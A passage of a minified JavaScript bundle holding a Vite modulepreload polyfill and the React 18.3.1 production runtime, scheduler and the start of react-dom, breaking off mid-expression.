(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))i(r);new MutationObserver(r=>{for(const s of r)if(s.type==="childList")for(const a of s.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&i(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const s={};return r.integrity&&(s.integrity=r.integrity),r.referrerPolicy&&(s.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?s.credentials="include":r.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function i(r){if(r.ep)return;r.ep=!0;const s=t(r);fetch(r.href,s)}})();var pp={exports:{}},Is={},mp={exports:{}},w={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Ji=Symbol.for("react.element"),sg=Symbol.for("react.portal"),ag=Symbol.for("react.fragment"),og=Symbol.for("react.strict_mode"),lg=Symbol.for("react.profiler"),ug=Symbol.for("react.provider"),cg=Symbol.for("react.context"),dg=Symbol.for("react.forward_ref"),pg=Symbol.for("react.suspense"),mg=Symbol.for("react.memo"),fg=Symbol.for("react.lazy"),Fu=Symbol.iterator;function hg(e){return e===null||typeof e!="object"?null:(e=Fu&&e[Fu]||e["@@iterator"],typeof e=="function"?e:null)}var fp={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},hp=Object.assign,gp={};function Wt(e,n,t){this.props=e,this.context=n,this.refs=gp,this.updater=t||fp}Wt.prototype.isReactComponent={};Wt.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};Wt.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function vp(){}vp.prototype=Wt.prototype;function dl(e,n,t){this.props=e,this.context=n,this.refs=gp,this.updater=t||fp}var pl=dl.prototype=new vp;pl.constructor=dl;hp(pl,Wt.prototype);pl.isPureReactComponent=!0;var ku=Array.isArray,yp=Object.prototype.hasOwnProperty,ml={current:null},xp={key:!0,ref:!0,__self:!0,__source:!0};function Sp(e,n,t){var i,r={},s=null,a=null;if(n!=null)for(i in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(s=""+n.key),n)yp.call(n,i)&&!xp.hasOwnProperty(i)&&(r[i]=n[i]);var o=arguments.length-2;if(o===1)r.children=t;else if(1<o){for(var l=Array(o),u=0;u<o;u++)l[u]=arguments[u+2];r.children=l}if(e&&e.defaultProps)for(i in o=e.defaultProps,o)r[i]===void 0&&(r[i]=o[i]);return{$$typeof:Ji,type:e,key:s,ref:a,props:r,_owner:ml.current}}function gg(e,n){return{$$typeof:Ji,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function fl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Ji}function vg(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var ju=/\/+/g;function ta(e,n){return typeof e=="object"&&e!==null&&e.key!=null?vg(""+e.key):n.toString(36)}function Nr(e,n,t,i,r){var s=typeof e;(s==="undefined"||s==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(s){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case Ji:case sg:a=!0}}if(a)return a=e,r=r(a),e=i===""?"."+ta(a,0):i,ku(r)?(t="",e!=null&&(t=e.replace(ju,"$&/")+"/"),Nr(r,n,t,"",function(u){return u})):r!=null&&(fl(r)&&(r=gg(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(ju,"$&/")+"/")+e)),n.push(r)),1;if(a=0,i=i===""?".":i+":",ku(e))for(var o=0;o<e.length;o++){s=e[o];var l=i+ta(s,o);a+=Nr(s,n,t,l,r)}else if(l=hg(e),typeof l=="function")for(e=l.call(e),o=0;!(s=e.next()).done;)s=s.value,l=i+ta(s,o++),a+=Nr(s,n,t,l,r);else if(s==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function cr(e,n,t){if(e==null)return e;var i=[],r=0;return Nr(e,i,"","",function(s){return n.call(t,s,r++)}),i}function yg(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var xe={current:null},Ir={transition:null},xg={ReactCurrentDispatcher:xe,ReactCurrentBatchConfig:Ir,ReactCurrentOwner:ml};function bp(){throw Error("act(...) is not supported in production builds of React.")}w.Children={map:cr,forEach:function(e,n,t){cr(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return cr(e,function(){n++}),n},toArray:function(e){return cr(e,function(n){return n})||[]},only:function(e){if(!fl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};w.Component=Wt;w.Fragment=ag;w.Profiler=lg;w.PureComponent=dl;w.StrictMode=og;w.Suspense=pg;w.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=xg;w.act=bp;w.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var i=hp({},e.props),r=e.key,s=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(s=n.ref,a=ml.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var o=e.type.defaultProps;for(l in n)yp.call(n,l)&&!xp.hasOwnProperty(l)&&(i[l]=n[l]===void 0&&o!==void 0?o[l]:n[l])}var l=arguments.length-2;if(l===1)i.children=t;else if(1<l){o=Array(l);for(var u=0;u<l;u++)o[u]=arguments[u+2];i.children=o}return{$$typeof:Ji,type:e.type,key:r,ref:s,props:i,_owner:a}};w.createContext=function(e){return e={$$typeof:cg,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:ug,_context:e},e.Consumer=e};w.createElement=Sp;w.createFactory=function(e){var n=Sp.bind(null,e);return n.type=e,n};w.createRef=function(){return{current:null}};w.forwardRef=function(e){return{$$typeof:dg,render:e}};w.isValidElement=fl;w.lazy=function(e){return{$$typeof:fg,_payload:{_status:-1,_result:e},_init:yg}};w.memo=function(e,n){return{$$typeof:mg,type:e,compare:n===void 0?null:n}};w.startTransition=function(e){var n=Ir.transition;Ir.transition={};try{e()}finally{Ir.transition=n}};w.unstable_act=bp;w.useCallback=function(e,n){return xe.current.useCallback(e,n)};w.useContext=function(e){return xe.current.useContext(e)};w.useDebugValue=function(){};w.useDeferredValue=function(e){return xe.current.useDeferredValue(e)};w.useEffect=function(e,n){return xe.current.useEffect(e,n)};w.useId=function(){return xe.current.useId()};w.useImperativeHandle=function(e,n,t){return xe.current.useImperativeHandle(e,n,t)};w.useInsertionEffect=function(e,n){return xe.current.useInsertionEffect(e,n)};w.useLayoutEffect=function(e,n){return xe.current.useLayoutEffect(e,n)};w.useMemo=function(e,n){return xe.current.useMemo(e,n)};w.useReducer=function(e,n,t){return xe.current.useReducer(e,n,t)};w.useRef=function(e){return xe.current.useRef(e)};w.useState=function(e){return xe.current.useState(e)};w.useSyncExternalStore=function(e,n,t){return xe.current.useSyncExternalStore(e,n,t)};w.useTransition=function(){return xe.current.useTransition()};w.version="18.3.1";mp.exports=w;var R=mp.exports;/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Sg=R,bg=Symbol.for("react.element"),Cg=Symbol.for("react.fragment"),Ag=Object.prototype.hasOwnProperty,Eg=Sg.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Pg={key:!0,ref:!0,__self:!0,__source:!0};function Cp(e,n,t){var i,r={},s=null,a=null;t!==void 0&&(s=""+t),n.key!==void 0&&(s=""+n.key),n.ref!==void 0&&(a=n.ref);for(i in n)Ag.call(n,i)&&!Pg.hasOwnProperty(i)&&(r[i]=n[i]);if(e&&e.defaultProps)for(i in n=e.defaultProps,n)r[i]===void 0&&(r[i]=n[i]);return{$$typeof:bg,type:e,key:s,ref:a,props:r,_owner:Eg.current}}Is.Fragment=Cg;Is.jsx=Cp;Is.jsxs=Cp;pp.exports=Is;var E=pp.exports,Ap={exports:{}},Ie={},Ep={exports:{}},Pp={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(L,M){var O=L.length;L.push(M);e:for(;0<O;){var k=O-1>>>1,J=L[k];if(0<r(J,M))L[k]=M,L[O]=J,O=k;else break e}}function t(L){return L.length===0?null:L[0]}function i(L){if(L.length===0)return null;var M=L[0],O=L.pop();if(O!==M){L[0]=O;e:for(var k=0,J=L.length,lr=J>>>1;k<lr;){var Xn=2*(k+1)-1,na=L[Xn],Qn=Xn+1,ur=L[Qn];if(0>r(na,O))Qn<J&&0>r(ur,na)?(L[k]=ur,L[Qn]=O,k=Qn):(L[k]=na,L[Xn]=O,k=Xn);else if(Qn<J&&0>r(ur,O))L[k]=ur,L[Qn]=O,k=Qn;else break e}}return M}function r(L,M){var O=L.sortIndex-M.sortIndex;return O!==0?O:L.id-M.id}if(typeof performance=="object"&&typeof performance.now=="function"){var s=performance;e.unstable_now=function(){return s.now()}}else{var a=Date,o=a.now();e.unstable_now=function(){return a.now()-o}}var l=[],u=[],c=1,d=null,p=3,g=!1,v=!1,x=!1,b=typeof setTimeout=="function"?setTimeout:null,h=typeof clearTimeout=="function"?clearTimeout:null,m=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function f(L){for(var M=t(u);M!==null;){if(M.callback===null)i(u);else if(M.startTime<=L)i(u),M.sortIndex=M.expirationTime,n(l,M);else break;M=t(u)}}function y(L){if(x=!1,f(L),!v)if(t(l)!==null)v=!0,ht(A);else{var M=t(u);M!==null&&or(y,M.startTime-L)}}function A(L,M){v=!1,x&&(x=!1,h(C),C=-1),g=!0;var O=p;try{for(f(M),d=t(l);d!==null&&(!(d.expirationTime>M)||L&&!z());){var k=d.callback;if(typeof k=="function"){d.callback=null,p=d.priorityLevel;var J=k(d.expirationTime<=M);M=e.unstable_now(),typeof J=="function"?d.callback=J:d===t(l)&&i(l),f(M)}else i(l);d=t(l)}if(d!==null)var lr=!0;else{var Xn=t(u);Xn!==null&&or(y,Xn.startTime-M),lr=!1}return lr}finally{d=null,p=O,g=!1}}var T=!1,S=null,C=-1,I=5,q=-1;function z(){return!(e.unstable_now()-q<I)}function Te(){if(S!==null){var L=e.unstable_now();q=L;var M=!0;try{M=S(!0,L)}finally{M?Cn():(T=!1,S=null)}}else T=!1}var Cn;if(typeof m=="function")Cn=function(){m(Te)};else if(typeof MessageChannel<"u"){var sr=new MessageChannel,ar=sr.port2;sr.port1.onmessage=Te,Cn=function(){ar.postMessage(null)}}else Cn=function(){b(Te,0)};function ht(L){S=L,T||(T=!0,Cn())}function or(L,M){C=b(function(){L(e.unstable_now())},M)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(L){L.callback=null},e.unstable_continueExecution=function(){v||g||(v=!0,ht(A))},e.unstable_forceFrameRate=function(L){0>L||125<L?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):I=0<L?Math.floor(1e3/L):5},e.unstable_getCurrentPriorityLevel=function(){return p},e.unstable_getFirstCallbackNode=function(){return t(l)},e.unstable_next=function(L){switch(p){case 1:case 2:case 3:var M=3;break;default:M=p}var O=p;p=M;try{return L()}finally{p=O}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(L,M){switch(L){case 1:case 2:case 3:case 4:case 5:break;default:L=3}var O=p;p=L;try{return M()}finally{p=O}},e.unstable_scheduleCallback=function(L,M,O){var k=e.unstable_now();switch(typeof O=="object"&&O!==null?(O=O.delay,O=typeof O=="number"&&0<O?k+O:k):O=k,L){case 1:var J=-1;break;case 2:J=250;break;case 5:J=1073741823;break;case 4:J=1e4;break;default:J=5e3}return J=O+J,L={id:c++,callback:M,priorityLevel:L,startTime:O,expirationTime:J,sortIndex:-1},O>k?(L.sortIndex=O,n(u,L),t(l)===null&&L===t(u)&&(x?(h(C),C=-1):x=!0,or(y,O-k))):(L.sortIndex=J,n(l,L),v||g||(v=!0,ht(A))),L},e.unstable_shouldYield=z,e.unstable_wrapCallback=function(L){var M=p;return function(){var O=p;p=M;try{return L.apply(this,arguments)}finally{p=O}}}})(Pp);Ep.exports=Pp;var Tg=Ep.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Lg=R,Ne=Tg;function P(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Tp=new Set,Li={};function mt(e,n){Ut(e,n),Ut(e+"Capture",n)}function Ut(e,n){for(Li[e]=n,e=0;e<n.length;e++)Tp.add(n[e])}var gn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Ga=Object.prototype.hasOwnProperty,Rg=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Uu={},Vu={};function Dg(e){return Ga.call(Vu,e)?!0:Ga.call(Uu,e)?!1:Rg.test(e)?Vu[e]=!0:(Uu[e]=!0,!1)}function qg(e,n,t,i){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return i?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Ng(e,n,t,i){if(n===null||typeof n>"u"||qg(e,n,t,i))return!0;if(i)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function Se(e,n,t,i,r,s,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=i,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=s,this.removeEmptyString=a}var de={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){de[e]=new Se(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];de[n]=new Se(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){de[e]=new Se(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){de[e]=new Se(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){de[e]=new Se(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){de[e]=new Se(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){de[e]=new Se(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){de[e]=new Se(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){de[e]=new Se(e,5,!1,e.toLowerCase(),null,!1,!1)});var hl=/[\-:]([a-z])/g;function gl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(hl,gl);de[n]=new Se(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(hl,gl);de[n]=new Se(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(hl,gl);de[n]=new Se(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){de[e]=new Se(e,1,!1,e.toLowerCase(),null,!1,!1)});de.xlinkHref=new Se("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){de[e]=new Se(e,1,!1,e.toLowerCase(),null,!0,!0)});function vl(e,n,t,i){var r=de.hasOwnProperty(n)?de[n]:null;(r!==null?r.type!==0:i||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Ng(n,t,r,i)&&(t=null),i||r===null?Dg(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,i=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,i?e.setAttributeNS(i,n,t):e.setAttribute(n,t))))}var bn=Lg.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,dr=Symbol.for("react.element"),yt=Symbol.for("react.portal"),xt=Symbol.for("react.fragment"),yl=Symbol.for("react.strict_mode"),Xa=Symbol.for("react.profiler"),Lp=Symbol.for("react.provider"),Rp=Symbol.for("react.context"),xl=Symbol.for("react.forward_ref"),Qa=Symbol.for("react.suspense"),Wa=Symbol.for("react.suspense_list"),Sl=Symbol.for("react.memo"),Pn=Symbol.for("react.lazy"),Dp=Symbol.for("react.offscreen"),_u=Symbol.iterator;function ei(e){return e===null||typeof e!="object"?null:(e=_u&&e[_u]||e["@@iterator"],typeof e=="function"?e:null)}var W=Object.assign,ia;function ci(e){if(ia===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);ia=n&&n[1]||""}return`
`+ia+e}var ra=!1;function sa(e,n){if(!e||ra)return"";ra=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(u){var i=u}Reflect.construct(e,[],n)}else{try{n.call()}catch(u){i=u}e.call(n.prototype)}else{try{throw Error()}catch(u){i=u}e()}}catch(u){if(u&&i&&typeof u.stack=="string"){for(var r=u.stack.split(`
`),s=i.stack.split(`
`),a=r.length-1,o=s.length-1;1<=a&&0<=o&&r[a]!==s[o];)o--;for(;1<=a&&0<=o;a--,o--)if(r[a]!==s[o]){if(a!==1||o!==1)do if(a--,o--,0>o||r[a]!==s[o]){var l=`
`+r[a].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}while(1<=a&&0<=o);break}}}finally{ra=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?ci(e):""}function Ig(e){switch(e.tag){case 5:return ci(e.type);case 16:return ci("Lazy");case 13:return ci("Suspense");case 19:return ci("SuspenseList");case 0:case 2:case 15:return e=sa(e.type,!1),e;case 11:return e=sa(e.type.render,!1),e;case 1:return e=sa(e.type,!0),e;default:return""}}function $a(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case xt:return"Fragment";case yt:return"Portal";case Xa:return"Profiler";case yl:return"StrictMode";case Qa:return"Suspense";case Wa:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Rp:return(e.displayName||"Context")+".Consumer";case Lp:return(e._context.displayName||"Context")+".Provider";case xl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case Sl:return n=e.displayName||null,n!==null?n:$a(e.type)||"Memo";case Pn:n=e._payload,e=e._init;try{return $a(e(n))}catch{}}return null}function Mg(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return $a(n);case 8:return n===yl?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function jn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function qp(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Og(e){var n=qp(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),i=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,s=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){i=""+a,s.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return i},setValue:function(a){i=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function pr(e){e._valueTracker||(e._valueTracker=Og(e))}function Np(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),i="";return e&&(i=qp(e)?e.checked?"true":"false":e.value),e=i,e!==t?(n.setValue(e),!0):!1}function Jr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function Ka(e,n){var t=n.checked;return W({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function Hu(e,n){var t=n.defaultValue==null?"":n.defaultValue,i=n.checked!=null?n.checked:n.defaultChecked;t=jn(n.value!=null?n.value:t),e._wrapperState={initialChecked:i,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Ip(e,n){n=n.checked,n!=null&&vl(e,"checked",n,!1)}function Ja(e,n){Ip(e,n);var t=jn(n.value),i=n.type;if(t!=null)i==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(i==="submit"||i==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?Ya(e,n.type,t):n.hasOwnProperty("defaultValue")&&Ya(e,n.type,jn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function zu(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var i=n.type;if(!(i!=="submit"&&i!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function Ya(e,n,t){(n!=="number"||Jr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var di=Array.isArray;function Mt(e,n,t,i){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&i&&(e[t].defaultSelected=!0)}else{for(t=""+jn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,i&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function Za(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(P(91));return W({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Gu(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(P(92));if(di(t)){if(1<t.length)throw Error(P(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:jn(t)}}function Mp(e,n){var t=jn(n.value),i=jn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),i!=null&&(e.defaultValue=""+i)}function Xu(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Op(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function eo(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Op(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var mr,wp=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,i,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,i,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(mr=mr||document.createElement("div"),mr.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=mr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function Ri(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var hi={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},wg=["Webkit","ms","Moz","O"];Object.keys(hi).forEach(function(e){wg.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),hi[n]=hi[e]})});function Bp(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||hi.hasOwnProperty(e)&&hi[e]?(""+n).trim():n+"px"}function Fp(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var i=t.indexOf("--")===0,r=Bp(t,n[t],i);t==="float"&&(t="cssFloat"),i?e.setProperty(t,r):e[t]=r}}var Bg=W({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function no(e,n){if(n){if(Bg[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(P(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(P(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(P(61))}if(n.style!=null&&typeof n.style!="object")throw Error(P(62))}}function to(e,n){if(e.indexOf("-")===-1)return typeof 